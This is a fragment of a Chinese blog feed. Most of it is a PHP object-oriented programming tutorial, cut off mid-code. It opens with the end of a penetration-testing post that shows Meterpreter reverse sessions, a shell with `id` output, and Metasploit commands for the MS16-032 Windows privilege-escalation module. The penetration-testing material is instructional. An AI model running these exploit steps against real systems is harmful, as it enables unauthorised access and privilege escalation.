class="number">172.20</span><span class="number">.10</span><span class="number">.4</span>:<span class="number">4444</span> -&gt; <span class="number">172.20</span><span class="number">.10</span><span class="number">.10</span>:<span class="number">56678</span> (<span class="number">172.20</span><span class="number">.10</span><span class="number">.10</span>)</span><br><span class="line">  <span class="number">3</span>         meterpreter python/linux  steady @ steady  <span class="number">172.20</span><span class="number">.10</span><span class="number">.4</span>:<span class="number">4444</span> -&gt; <span class="number">172.20</span><span class="number">.10</span><span class="number">.10</span>:<span class="number">56680</span> (<span class="number">172.20</span><span class="number">.10</span><span class="number">.10</span>)</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; sessions -i <span class="number">2</span></span><br><span class="line">[*] Starting interaction with <span class="number">2.</span>..</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process <span class="number">1241</span> created.</span><br><span class="line">Channel <span class="number">1</span> created.</span><br><span class="line">/bin/sh: <span class="number">0</span>: can<span class="number">&#x27;</span>t access tty; job control turned off</span><br><span class="line">$ id</span><br><span class="line">uid=<span class="number">1000</span>(steady) gid=<span class="number">1000</span>(steady) 组=<span class="number">1000</span>(steady),<span class="number">24</span>(cdrom),<span class="number">25</span>(floppy),<span class="number">27</span>(sudo),<span class="number">29</span>(audio),<span class="number">30</span>(dip),<span class="number">44</span>(video),<span class="number">46</span>(plugdev),<span class="number">109</span>(netdev),<span class="number">118</span>(bluetooth),<span class="number">128</span>(lpadmin),<span class="number">133</span>(scanner),<span class="number">1001</span>(wireshark)</span><br></pre></td></tr></table></figure><h2 id="msf-ms016-032的使用"><a href="#msf-ms016-032的使用" class="headerlink" title="msf-ms016-032的使用"></a>msf-ms016-032的使用</h2><h3 id="模块简介-1"><a href="#模块简介-1" class="headerlink" title="模块简介"></a>模块简介</h3><p>该模块利用的是Windows Secondary Logon服务中标准句柄清理功能的缺失。</p><h3 id="适用情况-1"><a href="#适用情况-1" class="headerlink" title="适用情况"></a>适用情况</h3><p>该漏洞会影响Windows7-10，Windows Server2008和2012，32位和64位都会受影响。</p><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><p>这个模块只对集成了powershell2.0或更高版本的Windows且具有多个CPU内核的系统有效。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP开发学习--核心编程5</title>
      <link href="2019/12/13/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B5/"/>
      <url>2019/12/13/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B5/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP核心编程5"><a href="#PHP核心编程5" class="headerlink" title="PHP核心编程5"></a>PHP核心编程5</h1><h2 id="静态属性和静态方法"><a href="#静态属性和静态方法" class="headerlink" title="静态属性和静态方法"></a>静态属性和静态方法</h2><p>static关键字修饰的属性，就是静态属性；</p><p>static关键字修饰的方法，就是静态方法；</p><p>静态属性：就是类的属性，与类相关，与对象无关；</p><p>静态方法：就是类的方法，与类相关，与对象无关；</p><p>类的东西(类常量、静态属性、静态方法)，通过”<strong><em>\</em>类名::**</strong>“来调用；</p><p>静态属性或静态方法，在内存中只有一份，被所有对象去共享；</p><p>静态属性或静态方法的好处：就是为了节省内存。例如：创建了100个对象，而静态属性只有一份。</p><p>静态属性和类常量的区别：类常量在一次HTTP请求过程值永远不变；但是静态属性可以改变。</p><p>静态属性和静态方法，都可以加权限控制符，而类常量没有权限。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//私有的保存人数的静态属性：所有对象共享</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> $count = <span class="number">60</span>;</span><br><span class="line"><span class="comment">//公共的静态方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$str = <span class="string">&quot;当前文件名：&quot;</span>.<span class="keyword">__FILE__</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;当前函数名：&quot;</span>.<span class="keyword">__FUNCTION__</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;当前方法名：&quot;</span>.<span class="keyword">__METHOD__</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;班级人数：&quot;</span>.Student::$count;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在类外访问公共的静态方法</span></span><br><span class="line"><span class="comment">//访问类的内容(类常量、静态属性、静态方法),不需要创建对象，直接访问</span></span><br><span class="line">Student::showInfo();</span><br></pre></td></tr></table></figure><h2 id="self关键字使用"><a href="#self关键字使用" class="headerlink" title="self关键字使用"></a>self关键字使用</h2><p>$this是指向当前对象的指针，而self是指向当前类的指针；</p><p>$this关键字用来调用对象的属性和方法；</p><p>self用来调用类常量、静态属性、静态方法；</p><p>$this关键字只能在成员方法中使用；</p><p>self关键字可以在成员方法和静态方法中使用；</p><p>提示：对象可以调用：成员属性、成员方法、静态方法</p><p>提示：self可以调用：类常量、静态属性、静态方法、成员方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//定义类常量</span></span><br><span class="line"><span class="keyword">const</span> TITLE = <span class="string">&quot;&lt;h2&gt;第69PHP就业班&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//私有的保存人数的静态属性：所有对象共享</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> $count = <span class="number">60</span>;</span><br><span class="line"><span class="comment">//公共的静态方法：在静态方法中$this不存在</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$str = <span class="built_in">self</span>::TITLE;</span><br><span class="line">$str .= <span class="string">&quot;当前文件名：&quot;</span>.<span class="keyword">__FILE__</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;当前函数名：&quot;</span>.<span class="keyword">__FUNCTION__</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;当前方法名：&quot;</span>.<span class="keyword">__METHOD__</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;班级人数：&quot;</span>.<span class="built_in">self</span>::$count;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="comment">//var_dump($this); $this不能存在于静态方法</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在类外访问公共的静态方法</span></span><br><span class="line"><span class="comment">//访问类的内容(类常量、静态属性、静态方法),不需要创建对象，直接访问</span></span><br><span class="line"><span class="comment">//对象可以调用：成员属性、成员方法、静态方法</span></span><br><span class="line">$obj = <span class="keyword">new</span> Student();</span><br><span class="line">$obj-&gt;showInfo();</span><br></pre></td></tr></table></figure><h2 id="类的封装性"><a href="#类的封装性" class="headerlink" title="类的封装性"></a>类的封装性</h2><h3 id="什么是类的封装性"><a href="#什么是类的封装性" class="headerlink" title="什么是类的封装性"></a>什么是类的封装性</h3><p>类的三大特性：封装性、继承性、多态性；</p><p>封装性：将敏感的数据保护起来，不被外界访问；还可以理解为，将一个功能的方方面面，封装成一个整体，即类；</p><p>类的封装性，是通过访问权限修饰符来实现的；</p><p>提示：在项目中，属性基本都是私有的。通过公有的方法，对私有的属性进行赋值和取值。</p><h3 id="访问权限修饰符介绍"><a href="#访问权限修饰符介绍" class="headerlink" title="访问权限修饰符介绍"></a>访问权限修饰符介绍</h3><p>public(公共的权限)：在任何地方都可以被访问，主要是类内、类外、子类中都可以被访问。</p><p>private(私有的权限)：只能在本类中被访问，类外和子类中无权访问。</p><p>protected(受保护的权限)：只能在本类中和子类中被访问，在类外不能访问。</p><h3 id="实例：数据库的封装类"><a href="#实例：数据库的封装类" class="headerlink" title="实例：数据库的封装类"></a>实例：数据库的封装类</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义最终的单例的数据库工具类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//私有的静态的保存对象的属性</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> $obj = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的数据库配置信息</span></span><br><span class="line"><span class="keyword">private</span> $db_host; <span class="comment">//主机名</span></span><br><span class="line"><span class="keyword">private</span> $db_user; <span class="comment">//用户名</span></span><br><span class="line"><span class="keyword">private</span> $db_pass; <span class="comment">//密码</span></span><br><span class="line"><span class="keyword">private</span> $db_name; <span class="comment">//数据库名</span></span><br><span class="line"><span class="keyword">private</span> $charset; <span class="comment">//字符集</span></span><br><span class="line"><span class="keyword">private</span> $link;   <span class="comment">//连接对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的构造方法：阻止类外new对象</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$config=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_host = $config[<span class="string">&#x27;db_host&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_user = $config[<span class="string">&#x27;db_user&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_pass = $config[<span class="string">&#x27;db_pass&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_name = $config[<span class="string">&#x27;db_name&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;charset = $config[<span class="string">&#x27;charset&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;connectDb(); <span class="comment">//连接MySQL服务器</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;selectDb();  <span class="comment">//选择数据库</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;setCharset();<span class="comment">//设置字符集</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的克隆方法：阻止类外clone对象</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的静态的创建对象的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params">$arr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//判断当前对象是否存在</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">self</span>::$obj <span class="keyword">instanceof</span> <span class="built_in">self</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果对象不存在，创建并保存它</span></span><br><span class="line"><span class="built_in">self</span>::$obj = <span class="keyword">new</span> <span class="built_in">self</span>($arr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回对象</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">self</span>::$obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的连接MySQL服务器方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connectDb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;link = @mysqli_connect(<span class="keyword">$this</span>-&gt;db_host, <span class="keyword">$this</span>-&gt;db_user, <span class="keyword">$this</span>-&gt;db_pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接MySQL服务器失败！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的选择数据库的方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">selectDb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!mysqli_select_db(<span class="keyword">$this</span>-&gt;link, <span class="keyword">$this</span>-&gt;db_name))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;选择数据库<span class="subst">&#123;$this-&gt;db_name&#125;</span>失败！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的设置字符集</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setCharset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mysqli_set_charset(<span class="keyword">$this</span>-&gt;link, <span class="keyword">$this</span>-&gt;charset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的析构方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mysqli_close(<span class="keyword">$this</span>-&gt;link); <span class="comment">//断开MySQL连接</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建数据库类的对象</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;db_host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_user&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_pass&#x27;</span> =&gt; <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_name&#x27;</span> =&gt; <span class="string">&#x27;phpshujuku&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">);</span><br><span class="line">$db1 = Db::getInstance($arr);</span><br><span class="line">$db2 = Db::getInstance($arr);</span><br><span class="line">var_dump($db1,$db2);</span><br></pre></td></tr></table></figure><h2 id="类的继承性"><a href="#类的继承性" class="headerlink" title="类的继承性"></a>类的继承性</h2><h3 id="什么是类的继承性？"><a href="#什么是类的继承性？" class="headerlink" title="什么是类的继承性？"></a>什么是类的继承性？</h3><p>CSS样式继承：父标签定义的样式，可以在子标签中直接使用。相同的样式只写一遍，减少代码量。</p><p>如果一个B类拥有了A类的所有特征信息，我们就说B类继承了A类。</p><p>A类可以称为：基础类(最顶层的类)、父类、上层类。</p><p>B类可以称为：最终类(最终的类)、子类、下层类。</p><p>提示：如果多个子类拥有相同的属性和方法，可以将相同的属性和方法提取出来，放到“父类”中，然后，再创建子类并继承父类；这样一样，重复的代码只写一遍，减少代码量，提高工作效率。</p><p>为什么要使用类的继承？是为了实现功能的升级和扩展。</p><p>功能的升级：原来有的功能，在子类进行完善。</p><p>功能的扩展：原来没有的功能，在子类增加新功能。</p><h3 id="单继承和多继承"><a href="#单继承和多继承" class="headerlink" title="单继承和多继承"></a>单继承和多继承</h3><p>单继承：只能从一个父类来继承功能。如：Java、PHP、C#等。</p><p>多继承：同时从多个父类来继承功能。如：C++。</p><h3 id="parent关键字"><a href="#parent关键字" class="headerlink" title="parent关键字"></a>parent关键字</h3><p>self代表当前类，parent代表父类。</p><p>self和parent可以存在于所有方法(成员方法和静态方法)中。</p><p>self用来调用本类的内容，包括：类常量、静态属性、静态方法、成员方法；</p><p>parent用来调用父类的内容，包括：类常量、静态属性、静态方法、成员方法；</p><p>self和parent都使用范围解析符”::”来调用其它内容。</p><p>语法：<code>parent::类常量 | 静态属性 | 静态方法 | 成员方法</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> TITLE = <span class="string">&quot;PHP第69期就业班&quot;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="built_in">static</span> $count = <span class="number">60</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个传智学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ItcastStudent</span> <span class="keyword">extends</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> TITLE = <span class="string">&quot;PHP第70期就业班&quot;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="built_in">static</span> $count = <span class="number">160</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$str = <span class="string">&quot;父类常量：&quot;</span>.<span class="built_in">parent</span>::TITLE;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;子类常量：&quot;</span>.<span class="built_in">self</span>::TITLE;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;父类静态属性：&quot;</span>.<span class="built_in">parent</span>::$count;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;子类静态属性：&quot;</span>.<span class="built_in">self</span>::$count;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建传智学生类对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> ItcastStudent();</span><br><span class="line">$obj-&gt;showInfo();</span><br></pre></td></tr></table></figure><h3 id="实例：单继承的简单演示"><a href="#实例：单继承的简单演示" class="headerlink" title="实例：单继承的简单演示"></a>实例：单继承的简单演示</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"><span class="keyword">const</span> TITLE = <span class="string">&quot;&lt;h2&gt;PHP第69期就业班&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="built_in">static</span> $count = <span class="number">60</span>;</span><br><span class="line"><span class="keyword">protected</span> $name = <span class="string">&quot;张三丰&quot;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readMe</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__METHOD__</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__METHOD__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个传智学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ItcastStudent</span> <span class="keyword">extends</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">abc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">$str = <span class="built_in">self</span>::TITLE;</span><br><span class="line">$str .= <span class="string">&quot;班级人数：&quot;</span>.ItcastStudent::$count;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;姓名：<span class="subst">&#123;$this-&gt;name&#125;</span>&quot;</span>;</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;静态方法：&quot;</span>.<span class="built_in">self</span>::readMe();</span><br><span class="line">$str .= <span class="string">&quot;&lt;br&gt;成员方法：&quot;</span>.<span class="keyword">$this</span>-&gt;showInfo();</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建传智学生类对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> ItcastStudent();</span><br><span class="line">$obj-&gt;abc();</span><br></pre></td></tr></table></figure><h2 id="类的多态"><a href="#类的多态" class="headerlink" title="类的多态"></a>类的多态</h2><h3 id="什么是类的多态？"><a href="#什么是类的多态？" class="headerlink" title="什么是类的多态？"></a>什么是类的多态？</h3><p>类的多态，就是类的多种形态。</p><p>类的多态主要指方法重载或方法重写。</p><p>方法重载：在同一个类中定义两个同名方法，PHP不支持。</p><p>方法重写：在子类中定义一个与父类同名的方法，就是“方法重写”。</p><p>为什么要重写方法？主要是实现功能的升级。父类中有的方法，子类中再用同样的名字再定义一次，一般来说，子类中方法的功能比父类更完善、更详尽。</p><h3 id="方法重写的要求"><a href="#方法重写的要求" class="headerlink" title="方法重写的要求"></a>方法重写的要求</h3><p>子类中重写的方法，要与父类中的方法同名；</p><p>子类中重写的方法形参个数，要与父类中的同名方法形参个数一致；</p><p>子类中重写的方法类型，要与父类中同名方法类型一致；</p><p>子类中重写的方法的访问权限，不能低于父类中同名方法的访问权限；</p><ul><li><p>父类方法权限为public，子类同名方法权限只能是public；</p></li><li><p>父类方法权限为protected，子类同名方法权限可以是protected和public；</p></li><li><p>父类方法权限为private，子类无法继承，也无法重写。</p></li></ul><p>注意：对于重写构造方法，就比较特殊，就没有形参个数的要求。</p><h3 id="实例：商品子类重写商品基础类中的方法"><a href="#实例：商品子类重写商品基础类中的方法" class="headerlink" title="实例：商品子类重写商品基础类中的方法"></a>实例：商品子类重写商品基础类中的方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//实例：类的三大特性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个基础商品类(最顶层)</span></span><br><span class="line"><span class="comment">//基础类是为了继承，不能直接创建对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shop</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//私有的商品属性</span></span><br><span 